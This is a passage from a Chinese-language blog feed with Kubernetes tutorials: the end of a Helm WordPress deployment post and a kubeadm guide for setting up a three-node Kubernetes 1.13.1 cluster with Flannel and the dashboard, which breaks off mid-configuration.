class="line"></span><br><span class="line">  NOTE: It may take a few minutes <span class="keyword">for</span> the LoadBalancer IP <span class="keyword">to</span> be available.</span><br><span class="line">        Watch the status <span class="keyword">with</span>: &#x27;kubectl get svc --namespace default -w wordpress-wordpress&#x27;</span><br><span class="line">  export SERVICE_IP=<span class="constructor">$(<span class="params">kubectl</span> <span class="params">get</span> <span class="params">svc</span> --<span class="params">namespace</span> <span class="params">default</span> <span class="params">wordpress</span>-<span class="params">wordpress</span> --<span class="params">template</span> <span class="string">&quot;&#123;&#123; range (index .status.loadBalancer.ingress 0) &#125;&#125;&#123;&#123;.&#125;&#125;&#123;&#123; end &#125;&#125;&quot;</span>)</span></span><br><span class="line">  echo <span class="string">&quot;WordPress URL: http://$SERVICE_IP/&quot;</span></span><br><span class="line">  echo <span class="string">&quot;WordPress Admin URL: http://$SERVICE_IP/admin&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="number">2.</span> Login <span class="keyword">with</span> the following credentials <span class="keyword">to</span> see your blog</span><br><span class="line"></span><br><span class="line">  echo Username: user</span><br><span class="line">  echo Password: <span class="constructor">$(<span class="params">kubectl</span> <span class="params">get</span> <span class="params">secret</span> --<span class="params">namespace</span> <span class="params">default</span> <span class="params">wordpress</span>-<span class="params">wordpress</span> -<span class="params">o</span> <span class="params">jsonpath</span>=<span class="string">&quot;&#123;.data.wordpress-password&#125;&quot;</span> | <span class="params">base64</span> --<span class="params">decode</span>)</span></span><br></pre></td></tr></table></figure><p>输出分为 3 部分（上文输出结果中的①②③）：</p><ul><li>① 本次部署 chart 的描述信息。包括 release 的名字（没有指定，则默认生成）。release 部署的 namespace，默认是 default。release的状态 DEPLOYED 表示已经将 chart 部署到集群。</li><li>② release 包含的资源： Service、 Deployment、 Secret 等</li><li>③ release 的使用方法</li></ul><h2 id="5-访问-wordpress"><a href="#5-访问-wordpress" class="headerlink" title="5. 访问  wordpress"></a>5. 访问  wordpress</h2><p>使用 <a href="http://nodeip+service_port/">http://nodeip+service_port</a> 访问wordpress，访问地址为：<a href="http://172.20.6.116:31051/">http://172.20.6.116:31051/</a><br><img data-src="/images/uploads/2019/01/wordpress.png" alt="wordpress"><br>其他信息，包括后台地址，管理员账号等信息可以参考release 的 NOTES 部分。</p><h1 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h1><p>Helm 的使用有点类似 ubuntu 的 apt 或者 RHEL 的 yum，极大的简化了部署一个应用的流程。对于使用者而言，使用 Helm 后不用需要了解 Kubernetes 的 yaml 语法并编写应用部署文件，也无需考虑应用的各种依赖，可以直接通过 Helm 下载并在 kubernetes 上安装需要的应用。<br>除此以外，Helm 还提供了 kubernetes 上的软件部署，删除，升级，回滚应用的强大功能。</p><hr><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://blog.csdn.net/CloudMan6/article/details/80140789">Helm 架构 - 每天5分钟玩转 Docker 容器技术（161）</a><br><a href="https://docs.helm.sh/using_helm/#installing-helm">Helm Quickstart</a></p>]]></content>
      
      
      <categories>
          
          <category> docker </category>
          
      </categories>
      
      
        <tags>
            
            <tag> kubernetes </tag>
            
            <tag> helm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用 kubeadm 部署 kubernetes 1.13.1</title>
      <link href="docker/use-kubeadmin-deploy-kubernetes.html"/>
      <url>docker/use-kubeadmin-deploy-kubernetes.html</url>
      
        <content type="html"><![CDATA[<p>最近有时间重新学习 k8s。k8s 的安装比之前简单了许多，本文介绍如何使用 kubeadm 部署 kubernetns 1.13.1</p><h1 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h1><h2 id="环境概览"><a href="#环境概览" class="headerlink" title="环境概览"></a>环境概览</h2><p>准备了3台机器，有一台master，两台node，主机名及IP如下：</p><table><thead><tr><th>主机名</th><th>IP地址</th></tr></thead><tbody><tr><td>k8s-master</td><td>172.20.6.116</td></tr><tr><td>k8s-node1</td><td>172.20.6.117</td></tr><tr><td>k8s-node2</td><td>172.20.6.118</td></tr></tbody></table><h2 id="系统设置"><a href="#系统设置" class="headerlink" title="系统设置"></a>系统设置</h2><h3 id="1-修改三台机器的主机名"><a href="#1-修改三台机器的主机名" class="headerlink" title="1. 修改三台机器的主机名"></a>1. 修改三台机器的主机名</h3><figure class="highlight gams"><table><tr><td class="code"><pre><span class="line"># hostnamectl <span class="keyword">set</span>-hostname <span class="comment">XXXX</span></span><br></pre></td></tr></table></figure><h3 id="2-设置本地解析"><a href="#2-设置本地解析" class="headerlink" title="2. 设置本地解析"></a>2. 设置本地解析</h3><p>编辑三台机器的 hosts 文件加入以下内容</p><figure class="highlight accesslog"><table><tr><td class="code"><pre><span class="line"># vim /etc/hosts</span><br><span class="line"></span><br><span class="line"><span class="number">172.20.6.116</span> k8s-master</span><br><span class="line"><span class="number">172.20.6.117</span> k8s-node1</span><br><span class="line"><span class="number">172.20.6.118</span> k8s-node2</span><br></pre></td></tr></table></figure><span id="more"></span><h3 id="3-关闭防火墙"><a href="#3-关闭防火墙" class="headerlink" title="3. 关闭防火墙"></a>3. 关闭防火墙</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> systemctl <span class="built_in">disable</span> firewalld</span></span><br></pre></td></tr></table></figure><h3 id="4-关闭selinux"><a href="#4-关闭selinux" class="headerlink" title="4. 关闭selinux"></a>4. 关闭selinux</h3><figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line"># sed -i s<span class="regexp">/SELINUX=enforcing/</span>SELINUX=disabled<span class="regexp">/g /</span>etc<span class="regexp">/selinux/</span>config</span><br></pre></td></tr></table></figure><h3 id="5-关闭NetworkManager"><a href="#5-关闭NetworkManager" class="headerlink" title="5. 关闭NetworkManager"></a>5. 关闭NetworkManager</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> systemctl <span class="built_in">disable</span> NetworkManager</span></span><br></pre></td></tr></table></figure><h3 id="6-设置时间同步"><a href="#6-设置时间同步" class="headerlink" title="6. 设置时间同步"></a>6. 设置时间同步</h3><p>所有机器上安装 chrony</p><figure class="highlight vala"><table><tr><td class="code"><pre><span class="line"><span class="meta"># yum install -y chrony</span></span><br></pre></td></tr></table></figure><p>设置时间同步(172.50.10.16为我本地的 NTP 服务器，也可以直接使用阿里云的NTP: time1.aliyun.com)</p><figure class="highlight vala"><table><tr><td class="code"><pre><span class="line"><span class="meta"># vim /etc/chrony.conf</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#server 0.centos.pool.ntp.org iburst</span></span><br><span class="line"><span class="meta">#server 1.centos.pool.ntp.org iburst</span></span><br><span class="line"><span class="meta">#server 2.centos.pool.ntp.org iburst</span></span><br><span class="line"><span class="meta">#server 3.centos.pool.ntp.org iburst</span></span><br><span class="line">server <span class="number">172.50</span><span class="number">.10</span><span class="number">.16</span> iburst</span><br></pre></td></tr></table></figure><p>启动服务并同步时间</p><figure class="highlight asciidoc"><table><tr><td class="code"><pre><span class="line"># systemctl enable chronyd &amp;&amp; systemctl restart chronyd</span><br><span class="line">#  chronyc sources</span><br><span class="line">210 Number of sources = 1</span><br><span class="line">MS Name/IP address         Stratum Poll Reach LastRx Last sample               </span><br><span class="line">===============================================================================</span><br><span class="line">^* 172.50.10.16                  3   6    17    13   <span class="code">+103us[  +</span>12us] +/-   24ms</span><br></pre></td></tr></table></figure><p>星号代表同步成功</p><h3 id="7-重启所有主机"><a href="#7-重启所有主机" class="headerlink" title="7. 重启所有主机"></a>7. 重启所有主机</h3><figure class="highlight vala"><table><tr><td class="code"><pre><span class="line"><span class="meta"># reboot</span></span><br></pre></td></tr></table></figure><h1 id="部署-kubernetes"><a href="#部署-kubernetes" class="headerlink" title="部署 kubernetes"></a>部署 kubernetes</h1><h2 id="安装-docker-ce-所有主机"><a href="#安装-docker-ce-所有主机" class="headerlink" title="安装 docker-ce(所有主机 )"></a>安装 docker-ce(所有主机 )</h2><h3 id="1-下载-docker-ce-源"><a href="#1-下载-docker-ce-源" class="headerlink" title="1. 下载 docker-ce 源"></a>1. 下载 docker-ce 源</h3><figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line"># wget -O <span class="regexp">/etc/yum</span>.repos.d<span class="regexp">/docker-ce.repo https:/</span><span class="regexp">/download.docker.com/</span>linux<span class="regexp">/centos/</span>docker-ce.repo</span><br></pre></td></tr></table></figure><h3 id="2-配置-docker-ce-使用国内源"><a href="#2-配置-docker-ce-使用国内源" class="headerlink" title="2. 配置 docker-ce 使用国内源"></a>2. 配置 docker-ce 使用国内源</h3><figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line"># sed -i <span class="string">&#x27;s+download.docker.com+mirrors.tuna.tsinghua.edu.cn/docker-ce+&#x27;</span> <span class="regexp">/etc/yum</span>.repos.d/docker-ce.repo</span><br></pre></td></tr></table></figure><h3 id="3-安装docker-ce"><a href="#3-安装docker-ce" class="headerlink" title="3. 安装docker-ce"></a>3. 安装docker-ce</h3><p>由于 kubernetes 1.13.1 只在 docker-ce 18.06以下测试过，所以指定安装的 docker-ce 版本</p><figure class="highlight subunit"><table><tr><td class="code"><pre><span class="line"># yum install docker-ce<span class="string">-18</span>.06.1.ce<span class="string">-3</span>.el7</span><br></pre></td></tr></table></figure><h3 id="4-启动并设置开机自启"><a href="#4-启动并设置开机自启" class="headerlink" title="4. 启动并设置开机自启"></a>4. 启动并设置开机自启</h3><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"># systemctl <span class="keyword">enable</span> docker.service &amp;&amp; systemctl <span class="keyword">start</span> docker.service</span><br></pre></td></tr></table></figure><h2 id="安装-kubeadm-kubelet-and-kubectl-所有主机"><a href="#安装-kubeadm-kubelet-and-kubectl-所有主机" class="headerlink" title="安装 kubeadm, kubelet and kubectl(所有主机)"></a>安装 kubeadm, kubelet and kubectl(所有主机)</h2><h3 id="1-配置-kubeadm-的源"><a href="#1-配置-kubeadm-的源" class="headerlink" title="1. 配置 kubeadm 的源"></a>1. 配置 kubeadm 的源</h3><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">cat &lt;&lt;EOF &gt; <span class="regexp">/etc/yum</span>.repos.d/kubernetes.repo</span><br><span class="line">[kubernetes]</span><br><span class="line">name=Kubernetes</span><br><span class="line">baseurl=https:<span class="regexp">//mi</span>rrors.aliyun.com<span class="regexp">/kubernetes/yum</span><span class="regexp">/repos/</span>kubernetes-el7-x86_64/</span><br><span class="line">enabled=<span class="number">1</span></span><br><span class="line">gpgcheck=<span class="number">1</span></span><br><span class="line">repo_gpgcheck=<span class="number">1</span></span><br><span class="line">gpgkey=https:<span class="regexp">//mi</span>rrors.aliyun.com<span class="regexp">/kubernetes/yum</span><span class="regexp">/doc/yum</span>-key.gpg https:<span class="regexp">//mi</span>rrors.aliyun.com<span class="regexp">/kubernetes/yum</span><span class="regexp">/doc/</span>rpm-package-key.gpg</span><br><span class="line">EOF</span><br></pre></td></tr></table></figure><h3 id="2-安装-kubeadm-kubelet-and-kubectl"><a href="#2-安装-kubeadm-kubelet-and-kubectl" class="headerlink" title="2. 安装 kubeadm, kubelet and kubectl"></a>2. 安装 kubeadm, kubelet and kubectl</h3><figure class="highlight vala"><table><tr><td class="code"><pre><span class="line"><span class="meta"># yum install -y kubelet kubeadm kubectl</span></span><br></pre></td></tr></table></figure><h3 id="3-启动并设置开机自启"><a href="#3-启动并设置开机自启" class="headerlink" title="3. 启动并设置开机自启"></a>3. 启动并设置开机自启</h3><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"># systemctl <span class="keyword">enable</span> kubelet &amp;&amp; systemctl <span class="keyword">start</span> kubelet</span><br></pre></td></tr></table></figure><h3 id="4-调整内核参数"><a href="#4-调整内核参数" class="headerlink" title="4. 调整内核参数"></a>4. 调整内核参数</h3><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="comment"># cat &lt;&lt;EOF &gt;  /etc/sysctl.d/k8s.conf</span></span><br><span class="line"><span class="attribute">net</span>.bridge.bridge-nf-call-ip<span class="number">6</span>tables = <span class="number">1</span></span><br><span class="line"><span class="attribute">net</span>.bridge.bridge-nf-call-iptables = <span class="number">1</span></span><br><span class="line"><span class="attribute">EOF</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># sysctl --system</span></span><br></pre></td></tr></table></figure><h2 id="初始化-k8s-（master-节点）"><a href="#初始化-k8s-（master-节点）" class="headerlink" title="初始化 k8s （master 节点）"></a>初始化 k8s （master 节点）</h2><h3 id="1-导入镜像包"><a href="#1-导入镜像包" class="headerlink" title="1. 导入镜像包"></a>1. 导入镜像包</h3><p>由于不可描述的原因，无法拉取k8s的镜像，所以我准备了一份离线的数据，需要在所有节点导入，下载地址：<a href="https://pan.baidu.com/s/1dKNbg7b9IBtPBnadLUADlg">kube.tar</a></p><figure class="highlight vala"><table><tr><td class="code"><pre><span class="line"><span class="meta"># docker load -i kube.tar </span></span><br></pre></td></tr></table></figure><p>查看导入后的镜像</p><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="comment"># docker images</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">REPOSITORY</span>                           TAG                 IMAGE ID            CREATED             SIZE</span><br><span class="line"><span class="attribute">k8s</span>.gcr.io/kube-proxy                v<span class="number">1</span>.<span class="number">13</span>.<span class="number">1</span>             fdb<span class="number">321</span>fd<span class="number">30</span>a<span class="number">0</span>        <span class="number">2</span> weeks ago         <span class="number">80</span>.<span class="number">2</span>MB</span><br><span class="line"><span class="attribute">k8s</span>.gcr.io/kube-controller-manager   v<span class="number">1</span>.<span class="number">13</span>.<span class="number">1</span>             <span class="number">26</span>e<span class="number">6</span>f<span class="number">1</span>db<span class="number">2</span>a<span class="number">52</span>        <span class="number">2</span> weeks ago         <span class="number">146</span>MB</span><br><span class="line"><span class="attribute">k8s</span>.gcr.io/kube-apiserver            v<span class="number">1</span>.<span class="number">13</span>.<span class="number">1</span>             <span class="number">40</span>a<span class="number">63</span>db<span class="number">91</span>ef<span class="number">8</span>        <span class="number">2</span> weeks ago         <span class="number">181</span>MB</span><br><span class="line"><span class="attribute">k8s</span>.gcr.io/kube-scheduler            v<span class="number">1</span>.<span class="number">13</span>.<span class="number">1</span>             ab<span class="number">81</span>d<span class="number">7360408</span>        <span class="number">2</span> weeks ago         <span class="number">79</span>.<span class="number">6</span>MB</span><br><span class="line"><span class="attribute">k8s</span>.gcr.io/coredns                   <span class="number">1</span>.<span class="number">2</span>.<span class="number">6</span>               f<span class="number">59</span>dcacceff<span class="number">4</span>        <span class="number">7</span> weeks ago         <span class="number">40</span>MB</span><br><span class="line"><span class="attribute">k8s</span>.gcr.io/etcd                      <span class="number">3</span>.<span class="number">2</span>.<span class="number">24</span>              <span class="number">3</span>cab<span class="number">8</span>e<span class="number">1</span>b<span class="number">9802</span>        <span class="number">3</span> months ago        <span class="number">220</span>MB</span><br><span class="line"><span class="attribute">quay</span>.io/coreos/flannel               v<span class="number">0</span>.<span class="number">10</span>.<span class="number">0</span>-amd<span class="number">64</span>       f<span class="number">0</span>fad<span class="number">859</span>c<span class="number">909</span>        <span class="number">11</span> months ago       <span class="number">44</span>.<span class="number">6</span>MB</span><br><span class="line"><span class="attribute">k8s</span>.gcr.io/pause                     <span class="number">3</span>.<span class="number">1</span>                 da<span class="number">86</span>e<span class="number">6</span>ba<span class="number">6</span>ca<span class="number">1</span>        <span class="number">12</span> months ago       <span class="number">742</span>kB</span><br></pre></td></tr></table></figure><h3 id="2-初始化-master-节点"><a href="#2-初始化-master-节点" class="headerlink" title="2. 初始化 master 节点"></a>2. 初始化 master 节点</h3><figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line"><span class="comment"># kubeadm init --pod-network-cidr=10.244.0.0/16</span></span><br><span class="line"></span><br><span class="line">**********</span><br><span class="line"></span><br><span class="line">You should now deploy <span class="keyword">a</span> pod network <span class="built_in">to</span> <span class="keyword">the</span> cluster.</span><br><span class="line">Run <span class="string">&quot;kubectl apply -f [podnetwork].yaml&quot;</span> <span class="keyword">with</span> <span class="literal">one</span> <span class="keyword">of</span> <span class="keyword">the</span> options listed <span class="keyword">at</span>:</span><br><span class="line">  <span class="keyword">https</span>://kubernetes.io/docs/concepts/cluster-administration/addons/</span><br><span class="line"></span><br><span class="line">You can now join <span class="keyword">any</span> <span class="built_in">number</span> <span class="keyword">of</span> machines <span class="keyword">by</span> running <span class="keyword">the</span> following <span class="keyword">on</span> <span class="title">each</span> <span class="title">node</span></span><br><span class="line"><span class="keyword">as</span> root:</span><br><span class="line"></span><br><span class="line">  kubeadm join <span class="number">172.20</span><span class="number">.6</span><span class="number">.116</span>:<span class="number">6443</span> <span class="comment">--token lyycbq.uogsx4a9h7ponmg5 --discovery-token-ca-cert-hash sha256:60d0338c4927907cf56d9697bcdb261cd2fe2dac0f36a9901b254253516177ed</span></span><br></pre></td></tr></table></figure><p>master节点初始化成功，注意保存最后的 kubeadmin join 的内容</p><h3 id="3-加载-k8s-环境变量"><a href="#3-加载-k8s-环境变量" class="headerlink" title="3. 加载 k8s 环境变量"></a>3. 加载 k8s 环境变量</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">export</span> KUBECONFIG=/etc/kubernetes/admin.conf</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">echo</span> <span class="string">&quot;export KUBECONFIG=/etc/kubernetes/admin.conf&quot;</span> &gt;&gt; ~/.bash_profile</span></span><br></pre></td></tr></table></figure><h3 id="4-安装-network-addon"><a href="#4-安装-network-addon" class="headerlink" title="4. 安装 network addon"></a>4. 安装 network addon</h3><p>要docker之间能互相通信需要做些配置，这里用Flannel来实现</p><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="comment"># kubectl apply -f https://raw.githubusercontent.com/coreos/flannel/bc79dd1505b0c8681ece4de4c0d86c5cd2643275/Documentation/kube-flannel.yml</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">clusterrole</span>.rbac.authorization.k<span class="number">8</span>s.io/flannel created</span><br><span class="line"><span class="attribute">clusterrolebinding</span>.rbac.authorization.k<span class="number">8</span>s.io/flannel created</span><br><span class="line"><span class="attribute">serviceaccount</span>/flannel created</span><br><span class="line"><span class="attribute">configmap</span>/kube-flannel-cfg created</span><br><span class="line"><span class="attribute">daemonset</span>.extensions/kube-flannel-ds-amd<span class="number">64</span> created</span><br><span class="line"><span class="attribute">daemonset</span>.extensions/kube-flannel-ds-arm<span class="number">64</span> created</span><br><span class="line"><span class="attribute">daemonset</span>.extensions/kube-flannel-ds-arm created</span><br><span class="line"><span class="attribute">daemonset</span>.extensions/kube-flannel-ds-ppc<span class="number">64</span>le created</span><br><span class="line"><span class="attribute">daemonset</span>.extensions/kube-flannel-ds-s<span class="number">390</span>x created</span><br></pre></td></tr></table></figure><h3 id="5-确认集群状态"><a href="#5-确认集群状态" class="headerlink" title="5. 确认集群状态"></a>5. 确认集群状态</h3><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="comment"># kubectl get pods --all-namespaces</span></span><br><span class="line"><span class="attribute">NAMESPACE</span>     NAME                                 READY   STATUS    RESTARTS   AGE</span><br><span class="line"><span class="attribute">kube</span>-system   coredns-<span class="number">86</span>c<span class="number">58</span>d<span class="number">9</span>df<span class="number">4</span>-lhb<span class="number">7</span>w             <span class="number">1</span>/<span class="number">1</span>     Running   <span class="number">0</span>          <span class="number">95</span>m</span><br><span class="line"><span class="attribute">kube</span>-system   coredns-<span class="number">86</span>c<span class="number">58</span>d<span class="number">9</span>df<span class="number">4</span>-zprwr             <span class="number">1</span>/<span class="number">1</span>     Running   <span class="number">0</span>          <span class="number">95</span>m</span><br><span class="line"><span class="attribute">kube</span>-system   etcd-k<span class="number">8</span>s-master                      <span class="number">1</span>/<span class="number">1</span>     Running   <span class="number">0</span>          <span class="number">100</span>m</span><br><span class="line"><span class="attribute">kube</span>-system   kube-apiserver-k<span class="number">8</span>s-master            <span class="number">1</span>/<span class="number">1</span>     Running   <span class="number">0</span>          <span class="number">100</span>m</span><br><span class="line"><span class="attribute">kube</span>-system   kube-controller-manager-k<span class="number">8</span>s-master   <span class="number">1</span>/<span class="number">1</span>     Running   <span class="number">0</span>          <span class="number">100</span>m</span><br><span class="line"><span class="attribute">kube</span>-system   kube-flannel-ds-amd<span class="number">64</span>-jjdmz          <span class="number">1</span>/<span class="number">1</span>     Running   <span class="number">0</span>          <span class="number">91</span>m</span><br><span class="line"><span class="attribute">kube</span>-system   kube-proxy-lfhbs                     <span class="number">1</span>/<span class="number">1</span>     Running   <span class="number">0</span>          <span class="number">101</span>m</span><br><span class="line"><span class="attribute">kube</span>-system   kube-scheduler-k<span class="number">8</span>s-master            <span class="number">1</span>/<span class="number">1</span>     Running   <span class="number">0</span>          <span class="number">100</span>m</span><br></pre></td></tr></table></figure><p>确认 CoreDNS pod 为运行状态</p><h2 id="加入集群（node节点）"><a href="#加入集群（node节点）" class="headerlink" title="加入集群（node节点）"></a>加入集群（node节点）</h2><h3 id="1-配置node节点加入集群"><a href="#1-配置node节点加入集群" class="headerlink" title="1. 配置node节点加入集群"></a>1. 配置node节点加入集群</h3><p>在 k8s-node1 和 k8s-node2 执行以下命令（初始化中保存的 join 命令)</p><figure class="highlight crmsh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># kubeadm join 172.20.6.116:6443 --token lyycbq.uogsx4a9h7ponmg5 --discovery-token-ca-cert-hash sha256:60d0338c4927907cf56d9697bcdb261cd2fe2dac0f36a9901b254253516177ed</span></span><br><span class="line"></span><br><span class="line">******</span><br><span class="line"></span><br><span class="line">This <span class="keyword">node</span> <span class="title">has</span> joined the cluster:</span><br><span class="line">* Certificate signing request was sent to apiserver <span class="keyword">and</span> a response was received.</span><br><span class="line">* The Kubelet was <span class="literal">inf</span>ormed of the new secure connection details.</span><br><span class="line"></span><br><span class="line">Run &#x27;kubectl get nodes&#x27; on the <span class="keyword">master</span> <span class="title">to</span> see this <span class="keyword">node</span> <span class="title">join</span> the cluster.</span><br></pre></td></tr></table></figure><h3 id="2-检查集群"><a href="#2-检查集群" class="headerlink" title="2. 检查集群"></a>2. 检查集群</h3><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="comment"># kubectl get nodes</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">NAME</span>         STATUS   ROLES    AGE     VERSION</span><br><span class="line"><span class="attribute">k8s</span>-master   Ready    master   <span class="number">2</span>m<span class="number">23</span>s   v<span class="number">1</span>.<span class="number">13</span>.<span class="number">1</span></span><br><span class="line"><span class="attribute">k8s</span>-node<span class="number">1</span>    Ready    &lt;none&gt;   <span class="number">39</span>s     v<span class="number">1</span>.<span class="number">13</span>.<span class="number">1</span></span><br><span class="line"><span class="attribute">k8s</span>-node<span class="number">2</span>    Ready    &lt;none&gt;   <span class="number">16</span>s     v<span class="number">1</span>.<span class="number">13</span>.<span class="number">1</span></span><br></pre></td></tr></table></figure><p>可以看到两个节点都已经加入了，并且是正常的ready状态。 <br>至此，整个集群的配置完成，可以开始使用了。</p><h2 id="配置-dashboard"><a href="#配置-dashboard" class="headerlink" title="配置 dashboard"></a>配置 dashboard</h2><h3 id="服务配置"><a href="#服务配置" class="headerlink" title="服务配置"></a>服务配置</h3><p>默认没有web页面，可以通过以下步骤部署 dashboard</p><h4 id="1-导入-dashboard-ui（所有节点）"><a href="#1-导入-dashboard-ui（所有节点）" class="headerlink" title="1. 导入 dashboard-ui（所有节点）"></a>1. 导入 dashboard-ui（所有节点）</h4><p>下载地址：<a href="https://pan.baidu.com/s/1dKNbg7b9IBtPBnadLUADlg">dashboard-ui.tar</a></p><figure class="highlight vala"><table><tr><td class="code"><pre><span class="line"><span class="meta"># docker load -i dashboard-ui.tar</span></span><br></pre></td></tr></table></figure><h4 id="2-下载配置文件"><a href="#2-下载配置文件" class="headerlink" title="2. 下载配置文件"></a>2. 下载配置文件</h4><figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line"><span class="meta"># wget https:<span class="comment">//raw.githubusercontent.com/kubernetes/dashboard/master/aio/deploy/recommended/kubernetes-dashboard.yaml</span></span></span><br></pre></td></tr></table></figure><p>编辑kubernetes-dashboard.yaml文件，添加type: NodePort，暴露Dashboard服务，便于从外部访问dashboard。注意这里只添加行type: NodePort即可，其他配置不用改。</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">type:</span> <span class="string">NodePort</span></span><br><span class="line">  <span class="attr">ports:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">port:</span> <span class="number">443</span></span><br><span class="line">      <span class="attr">targetPort:</span> <span class="number">8443</span></span><br></pre></td></tr></table></figure><h4 id="3-部署-Dashboard-UI"><a href="#3-部署-Dashboard-UI" class="headerlink" title="3. 部署 Dashboard UI"></a>3. 部署 Dashboard UI</h4><figure class="highlight vala"><table><tr><td class="code"><pre><span class="line"><span class="meta"># kubectl create -f  kubernetes-dashboard.yaml</span></span><br></pre></td></tr></table></figure><h4 id="4-查看-dashboard-服务状态"><a href="#4-查看-dashboard-服务状态" class="headerlink" title="4. 查看 dashboard 服务状态"></a>4. 查看 dashboard 服务状态</h4><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="comment"># kubectl get pods --all-namespaces</span></span><br><span class="line"><span class="attribute">NAMESPACE</span>     NAME                                   READY   STATUS    RESTARTS   AGE</span><br><span class="line"><span class="attribute">kube</span>-system   coredns-<span class="number">86</span>c<span class="number">58</span>d<span class="number">9</span>df<span class="number">4</span>-<span class="number">8</span>zhr<span class="number">5</span>               <span class="number">1</span>/<span class="number">1</span>     Running   <span class="number">0</span>          <span class="number">2</span>d<span class="number">22</span>h</span><br><span class="line"><span class="attribute">kube</span>-system   coredns-<span class="number">86</span>c<span class="number">58</span>d<span class="number">9</span>df<span class="number">4</span>-jqn<span class="number">7</span>r               <span class="number">1</span>/<span class="number">1</span>     Running   <span class="number">0</span>          <span class="number">2</span>d<span class="number">22</span>h</span><br><span class="line"><span class="attribute">kube</span>-system   etcd-k<span class="number">8</span>s-master                        <span class="number">1</span>/<span class="number">1</span>     Running   <span class="number">0</span>          <span class="number">2</span>d<span class="number">22</span>h</span><br><span class="line"><span class="attribute">kube</span>-system   kube-apiserver-k<span class="number">8</span>s-master              <span class="number">1</span>/<span class="number">1</span>     Running   <span class="number">0</span>          <span class="number">2</span>d<span class="number">22</span>h</span><br><span class="line"><span class="attribute">kube</span>-system   kube-controller-manager-k<span class="number">8</span>s-master     <span class="number">1</span>/<span class="number">1</span>     Running   <span class="number">0</span>          <span class="number">2</span>d<span class="number">22</span>h</span><br><span class="line"><span class="attribute">kube</span>-system   kube-flannel-ds-amd<span class="number">64</span>-krf<span class="number">6</span>t            <span class="number">1</span>/<span class="number">1</span>     Running   <span class="number">0</span>          <span class="number">2</span>d<span class="number">22</span>h</span><br><span class="line"><span class="attribute">kube</span>-system   kube-flannel-ds-amd<span class="number">64</span>-tkftg            <span class="number">1</span>/<span class="number">1</span>     Running   <span class="number">0</span>          <span class="number">2</span>d<span class="number">22</span>h</span><br><span class="line"><span class="attribute">kube</span>-system   kube-flannel-ds-amd<span class="number">64</span>-zxzld            <span class="number">1</span>/<span class="number">1</span>     Running   <span class="number">0</span>          <span class="number">2</span>d<span class="number">22</span>h</span><br><span class="line"><span class="attribute">kube</span>-system   kube-proxy-<span class="number">5</span>znt<span class="number">7</span>                       <span class="number">1</span>/<span class="number">1</span>     Running   <span class="number">0</span>          <span class="number">2</span>d<span class="number">22</span>h</span><br><span class="line"><span class="attribute">kube</span>-system   kube-proxy-gl<span class="number">9</span>sl                       <span class="number">1</span>/<span class="number">1</span>     Running   <span class="number">0</span>          <span class="number">2</span>d<span class="number">22</span>h</span><br><span class="line"><span class="attribute">kube</span>-system   kube-proxy-q<span class="number">7</span>j<span class="number">7</span>m                       <span class="number">1</span>/<span class="number">1</span>     Running   <span class="number">0</span>          <span class="number">2</span>d<span class="number">22</span>h</span><br><span class="line"><span class="attribute">kube</span>-system   kube-scheduler-k<span class="number">8</span>s-master              <span class="number">1</span>/<span class="number">1</span>     Running   <span class="number">0</span>          <span class="number">2</span>d<span class="number">22</span>h</span><br><span class="line"><span class="attribute">kube</span>-system   kubernetes-dashboard-<span class="number">57</span>df<span class="number">4</span>db<span class="number">6</span>b-pghk<span class="number">8</span>   <span class="number">1</span>/<span class="number">1</span>     Running   <span class="number">0</span>          <span class="number">19</span>h</span><br></pre></td></tr></table></figure><p>kubernetes-dashboard 为运行状态</p><h3 id="创建简单用户"><a href="#创建简单用户" class="headerlink" title="创建简单用户"></a>创建简单用户</h3><h4 id="1-创建服务账号和集群角色绑定配置文件"><a href="#1-创建服务账号和集群角色绑定配置文件" class="headerlink" title="1. 创建服务账号和集群角色绑定配置文件"></a>1. 创建服务账号和集群角色绑定配置文件</h4><p>创建 dashboard-adminuser.yaml 文件，加入以下内容：</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># vim dashboard-adminuser.yaml</span></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">ServiceAccount</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">labels:</span></span><br><span class="line">    <span class="attr">k8s-app:</span> <span class="string">kubernetes-dashboard</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">kubernetes-dashboard-admin</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">kube-system</span></span><br><span 